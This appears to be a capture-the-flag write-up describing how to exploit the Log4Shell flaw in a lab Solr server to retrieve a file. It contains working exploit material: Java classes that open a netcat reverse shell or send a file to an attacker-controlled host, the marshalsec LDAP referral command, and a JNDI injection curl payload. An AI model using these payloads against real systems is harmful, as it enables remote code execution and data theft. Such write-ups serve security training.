<h1 id="bonus-red-log4jack">Bonus Red Log4Jack</h1>
<p><strong>Location: North Pole</strong><br>
<strong>Troll: Icky McGoop</strong></p>
<p>This exercise runs in a Cranberry Pi terminal, focusing on exploiting the Log4J vulnerability recently discovered.<br>
Multiple terminal session are created automatically, one running a web server serving from <code>/home/troll/web</code> on port 8080, another one running a netcat listener on port 4444.</p>
<p>The objective is to retrieve the file <code>/home/solr/kringle.txt</code> from a web service running solr on <a href="http://solrpower.kringlecastle.com:8983/">http://solrpower.kringlecastle.com:8983/</a>.</p>
<p>First a Java class <code>Joergen</code> creating a reverse shell is created:</p>
<pre class=" language-java"><code class="prism  language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Joergen</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"nc CLIENTIP 4444 -e /bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            err<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p><em>CLIENTIP</em> has to be replaced with the terminal’s IP address.<br>
This is placed in the web tree, so that the web server is able to hand out this class.<br>
Next the <a href="https://github.com/mbechler/marshalsec">marshalsec</a> installation residing in <code>/home/troll/marshalsec</code>  is started:</p>
<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://WEBSERVERIP:8080/#Joergen"
</code></pre>
<p><em>WEBSERVERIP</em> has to be replaced with the terminal’s IP address.<br>
This application acts as an LDAP server and uses the Java class on the web server as remote code base.</p>
<p>Finally the Log4J vulnerability is triggered:</p>
<pre><code>curl 'http://solrpower.kringlecastle.com:8983/solr/admin/cores?foo=$\{jndi:ldap://MARSHALSECIP:1389/YuleLogExploit\}'
</code></pre>
<p><em>MARSHALSECIP</em> has to be replaced with the terminal’s IP address.</p>
<p>This triggers on the solr server an LDAP connection to the marshalsec service, which in turn delivers the Java class hosted on the web server. The solr server then executes this class, effectively creating a reverse shell connection to the netcat listener. This allows the file <code>kringle.txt</code> to be retrieved.</p>
<pre><code>cat /home/solr/kringle.txt

The solution to Log4shell is patching.
Sincerely,

Santa
</code></pre>
<p>So <strong>patching</strong> is the solution.</p>
<h3 id="alternative-1-just-reading-the-targeted-file">Alternative 1: just reading the targeted file</h3>
<pre class=" language-java"><code class="prism  language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Joergen</span> <span class="token punctuation">{</span>
  <span class="token keyword">static</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      Process p<span class="token operator">=</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"nc CLIENTIP 4444"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      Path path<span class="token operator">=</span>Paths<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/home/solr/kringle.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> Files<span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
      OutputStream out<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
      out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      err<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p><em>CLIENTIP</em> has to be replaced with the terminal’s IP address.</p>
<h3 id="alternative-2-pure-java-solution-hence-platform-independant">Alternative 2: pure Java solution, hence platform independant</h3>
<pre class=" language-java"><code class="prism  language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>Socket<span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Joergen</span> <span class="token punctuation">{</span>
  <span class="token keyword">static</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      Socket socket<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span><span class="token string">"CLIENTIP"</span><span class="token punctuation">,</span><span class="token number">4444</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      PrintStream out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PrintStream</span><span class="token punctuation">(</span> socket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
      Path path<span class="token operator">=</span>Paths<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/home/solr/kringle.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> Files<span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
      out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      err<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p><em>CLIENTIP</em> has to be replaced with the terminal’s IP address.</p>
<p><strong>Achievement: Log4J Red Bonus</strong></p>

